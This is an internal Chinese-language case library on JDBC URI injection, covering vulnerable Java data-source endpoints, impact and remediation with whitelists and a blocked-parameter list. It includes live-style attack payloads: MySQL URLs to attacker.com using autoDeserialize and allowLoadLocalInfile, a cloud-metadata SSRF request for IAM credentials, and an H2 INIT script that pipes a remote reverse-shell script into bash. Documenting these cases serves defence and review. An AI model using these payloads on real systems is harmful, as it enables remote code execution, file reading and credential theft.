# JDBC URI 注入 - 漏洞案例库

> 数据来源：内部漏洞数据库（vul_type_id=72，18 条案例）+ 行业经典案例
> 脱敏处理：系统名称、域名、IP 均已脱敏

---

## 内部案例

### 案例1：数据平台 - 离线同步任务 JDBC URL 注入（RCE）

**来源**：内部漏洞数据库 vul_type_id=72
**系统**：某内部数据离线同步平台（Hive2MySQL 场景）
**接口**：`/task/datasource/add` 类接口
**危害等级**：严重（RCE）

**漏洞描述**：
离线数据同步任务创建功能中，用户可以通过 API 提交源数据库和目标数据库的连接信息（包括 JDBC URL）。系统直接使用用户传入的 JDBC URL 建立数据库连接，未对 URL 中的危险参数（`autoDeserialize`、`queryInterceptors` 等）进行过滤，也未限制可连接的 host 范围。

**漏洞代码（已脱敏）**：
```java
@PostMapping("/task/datasource/test")
public Result testDataSource(@RequestBody DataSourceConfig config) {
    // 漏洞：直接使用用户传入的 JDBC URL
    try (Connection conn = DriverManager.getConnection(
            config.getJdbcUrl(),
            config.getUsername(),
            config.getPassword())) {
        return Result.success("连接成功");
    } catch (SQLException e) {
        return Result.error(e.getMessage());
    }
}
```

**攻击载荷（MySQL JDBC RCE）**：
```
POST /task/datasource/test
{
  "jdbcUrl": "jdbc:mysql://attacker.com:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
  "username": "root",
  "password": "root"
}
```

**攻击效果**：
1. 服务端向攻击者控制的 MySQL 服务器发起连接
2. 攻击者的恶意 MySQL 服务器返回序列化恶意对象
3. 触发 `ServerStatusDiffInterceptor` 执行反序列化 → RCE

**利用工具**：`ysoserial` 生成 payload + `fake-mysql-server` 响应恶意序列化数据

**攻击载荷（任意文件读取）**：
```json
{
  "jdbcUrl": "jdbc:mysql://attacker.com:3306/test?allowLoadLocalInfile=true",
  "username": "root",
  "password": "root"
}
```

**攻击效果**：攻击者 MySQL 服务器执行 `LOAD DATA LOCAL INFILE '/etc/passwd'` 读取服务器本地文件

**修复方案**：
```java
private static final Set<String> ALLOWED_DRIVERS = Set.of(
    "com.mysql.cj.jdbc.Driver",
    "org.postgresql.Driver",
    "org.apache.hive.jdbc.HiveDriver"
);
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "mysql-prod.internal.example.com",
    "mysql-test.internal.example.com"
);
private static final List<String> BLOCKED_PARAMS = List.of(
    "autoDeserialize", "queryInterceptors",
    "allowLoadLocalInfile", "allowUrlInLocalInfile",
    "socketFactory", "socketFactoryArg"
);

public void validateAndConnect(DataSourceConfig config) throws Exception {
    // 1. 驱动白名单
    if (!ALLOWED_DRIVERS.contains(config.getDriverClass())) {
        throw new SecurityException("驱动不在白名单中");
    }
    // 2. 解析 URL，检查 host
    URI uri = new URI(config.getJdbcUrl().substring(5));
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new SecurityException("Host 不在白名单中");
    }
    // 3. 检查危险参数
    String query = uri.getQuery();
    if (query != null) {
        for (String param : BLOCKED_PARAMS) {
            if (query.toLowerCase().contains(param.toLowerCase())) {
                throw new SecurityException("含有危险参数: " + param);
            }
        }
    }
    DriverManager.getConnection(config.getJdbcUrl(), config.getUsername(), config.getPassword());
}
```

**结论**：漏洞（严重）

---

### 案例2：数据平台 - Hive 数据源添加接口 SSRF

**来源**：内部漏洞数据库 vul_type_id=72
**系统**：某内部数据开发平台
**接口**：`/datasource/hive/add`
**危害等级**：高（SSRF）

**漏洞描述**：
数据开发平台支持用户自助添加 Hive 数据源。接口接收 `host`、`port`、`database` 参数，服务端自动拼接为 Hive JDBC URL 并建立连接。由于没有 host 白名单，攻击者可以将 host 设置为内网地址（包括云元数据地址），探测内网服务或获取云凭证。

**漏洞代码（已脱敏）**：
```java
@PostMapping("/datasource/hive/add")
public Result addHiveDatasource(@RequestBody HiveDatasourceRequest req) {
    String jdbcUrl = String.format("jdbc:hive2://%s:%d/%s",
        req.getHost(),      // 漏洞：无 host 白名单
        req.getPort(),
        req.getDatabase()
    );
    try (HiveConnection conn = (HiveConnection) DriverManager.getConnection(jdbcUrl)) {
        // 保存数据源配置
        datasourceService.save(req);
        return Result.success();
    }
}
```

**攻击载荷（云元数据 SSRF）**：
```json
{
  "host": "169.254.169.254",
  "port": 80,
  "database": "latest/meta-data/iam/security-credentials/"
}
```

**攻击效果**：服务端向云元数据服务发起 HTTP 请求，可获取 IAM 凭证（AccessKeyId/SecretAccessKey）

**攻击载荷（内网探测）**：
```json
{
  "host": "192.168.1.1",
  "port": 22,
  "database": "test"
}
```

**攻击效果**：通过响应时间和错误信息判断内网端口开放情况

**结论**：漏洞（高）

---

### 案例3：数据平台 - ClickHouse 数据源 SSRF + 信息泄露

**来源**：内部漏洞数据库 vul_type_id=72
**系统**：某内部数据查询平台
**接口**：`/datasource/clickhouse/validate`
**危害等级**：高

**漏洞描述**：
ClickHouse 数据源验证接口，使用用户传入的 host 和 port 构造 ClickHouse JDBC URL。攻击者可将 host 指向内网服务，利用 ClickHouse JDBC 驱动的 HTTP 请求特性探测内网，或连接到攻击者控制的 ClickHouse 服务泄露查询结果。

**漏洞代码（已脱敏）**：
```java
@GetMapping("/datasource/clickhouse/validate")
public Result validateClickhouse(
        @RequestParam String host,
        @RequestParam int port,
        @RequestParam String database) {
    String url = "jdbc:clickhouse://" + host + ":" + port + "/" + database;
    ClickHouseDataSource dataSource = new ClickHouseDataSource(url);
    try (Connection conn = dataSource.getConnection()) {
        return Result.success("连接成功");
    }
}
```

**攻击载荷**：`host=internal-service.corp.example.com&port=9000&database=test`

**结论**：漏洞（高）

---

### 案例4：数据开发平台 - JDBC URL 反序列化（Hive JDBC）

**来源**：内部漏洞数据库 vul_type_id=72
**系统**：某内部离线 Hive 查询平台
**接口**：数据源连接测试接口
**危害等级**：严重（反序列化 RCE）

**漏洞描述**：
Hive JDBC 连接时，服务端未对 Hive Thrift 服务器响应进行验证。攻击者搭建恶意 Hive 服务，通过 Thrift 协议返回恶意序列化 Java 对象，触发客户端（数据平台服务器）反序列化 RCE。

**利用条件**：
1. 用户可控制 Hive JDBC URL（host 字段）
2. 服务器 classpath 中存在可用的 `ysoserial` Gadget（如 `commons-collections`）
3. 攻击者可搭建监听服务模拟 Hive Thrift Server

**攻击效果**：在数据平台服务器上执行任意命令

**结论**：漏洞（严重）

---

### 案例5：多数据源管理 - JDBC URL 批量注入

**来源**：内部漏洞数据库 vul_type_id=72（批量添加接口）
**系统**：某内部多租户数据管理平台
**危害等级**：高

**漏洞描述**：
数据管理平台支持通过 API 批量导入数据源配置（CSV/JSON 格式）。导入时直接对每条 JDBC URL 建立连接测试，无批量请求的防护限制。攻击者可在导入文件中插入多个恶意 JDBC URL，批量触发 SSRF/RCE。

**漏洞点**：批量导入接口对每条 URL 逐一调用 `DriverManager.getConnection(url)` 验证连接

**结论**：漏洞（高）

---

## 行业经典案例

### 案例6：MySQL JDBC URL autoDeserialize RCE（通用场景）

**类型**：JDBC URI 注入 → 反序列化 RCE
**适用版本**：MySQL Connector/J < 8.0.21（高版本也需关注）
**危害等级**：严重

**原理**：
MySQL Connector/J 支持 `autoDeserialize` 参数，当该参数为 `true` 时，`ResultSet.getObject()` 会自动对 BLOB 字段进行 Java 反序列化。攻击者控制 MySQL 服务器，在响应中返回恶意序列化对象，触发客户端 RCE。

**完整攻击链**：
```
1. 攻击者控制 JDBC URL: jdbc:mysql://attacker:3306/db?autoDeserialize=true&queryInterceptors=...
2. 客户端连接攻击者的 MySQL 服务
3. 攻击者服务器发送包含恶意序列化数据的响应
4. queryInterceptors 触发 getObject() 反序列化
5. RCE
```

**利用工具**：
- `fake-mysql-server` (模拟恶意 MySQL 服务)
- `ysoserial` (生成反序列化 payload)

---

### 案例7：H2 数据库 INIT 参数 RCE

**类型**：JDBC URI 注入 → RCE（脚本执行）
**危害等级**：严重

**原理**：
H2 JDBC URL 支持 `INIT` 参数，允许在连接时执行 SQL 脚本（包括远程脚本）。

**攻击载荷**：
```
jdbc:h2:mem:testdb;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'
```

**rce.sql 内容**：
```sql
CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime.getRuntime().exec(cmd); return ""; } $$;
CALL EXEC('curl http://attacker.com/reverse_shell.sh | bash');
```

---

## 案例规律总结

| 维度 | 规律 |
|------|------|
| **最高发场景** | 数据平台/数据开发工具的"添加数据源"、"测试连接"功能 |
| **高发语言** | Java（JDBC 是 Java 生态专属） |
| **主要危害** | RCE（autoDeserialize + 反序列化）、SSRF（内网探测/云元数据）、文件读取 |
| **常见 Sink** | `DriverManager.getConnection()`、`HikariConfig.setJdbcUrl()`、`ClickHouseDataSource` |
| **高危驱动** | MySQL Connector/J、Hive JDBC、H2 |
| **核心防护** | 三重白名单（驱动类 + host + 参数）+ 禁止用户直接控制 URL |
| **误判风险** | 将 JDBC URL 注入与 SQL 注入混淆；将 PreparedStatement 视为本类型的防护 |

---

## 参考资料

- BlackHat USA 2021: "JDBC Deserialization Vulnerabilities"
- MySQL Connector/J Security Advisory: CVE-2019-2692
- 内部漏洞数据库：vul_type_id=72，18 条真实案例
- JDBC URL 危险参数参考：`autoDeserialize`、`queryInterceptors`、`allowLoadLocalInfile`、`socketFactory`
